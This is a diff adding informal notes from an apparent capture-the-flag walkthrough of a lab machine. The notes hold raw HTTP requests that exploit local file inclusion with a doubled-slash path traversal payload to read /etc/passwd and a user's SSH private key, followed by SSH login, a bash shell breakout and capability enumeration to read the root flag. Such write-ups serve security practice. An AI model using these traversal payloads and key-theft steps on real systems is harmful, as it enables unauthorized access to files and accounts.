@@ -1,0 +1,89 @@
+we found 80 and its LFI vulnerable
+
+POST /dirRead.php HTTP/1.1
+
+Host: 10.10.10.87
+
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.10.87/list.html
+
+Content-type: application/x-www-form-urlencoded
+
+Content-Length: 13
+
+Connection: close
+
+
+
+path=./.list/
+
+
+we change this to
+
+
+
+
+
+
+POST /fileRead.php HTTP/1.1
+
+Host: 10.10.10.87
+
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.10.87/list.html
+
+Content-type: application/x-www-form-urlencoded
+
+Content-Length: 42
+
+Connection: close
+
+
+
+file=./....//....//....//....//etc//passwd
+
+find the ssh key next change the line to
+----------------------------------------
+path=./....//....//....//....//home//nobody
+
+-----------------------------------
+./....//....//....//....//home//nobody//.ssh
+-----------------------------------------
+file=./....//....//....//....//home//nobody//.ssh//.monitor
+----------------------------------------
+
+
+ i got id-rsa ssh for nobody 
+
+i just login and i got .ssh/.monotor ssh key i just login with ssh -i .monotor monitor@localhost
+
+but its not bash shell i tried with  ssh -i .monotor monitor@localhost -t bash
+
+i got bash 
+
+root priv esc 
+
+export SHELL=/bin/bash
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
+
+
+getcap -r / 2>/dev/null
+tac /root/root.txt
+
+
+
+
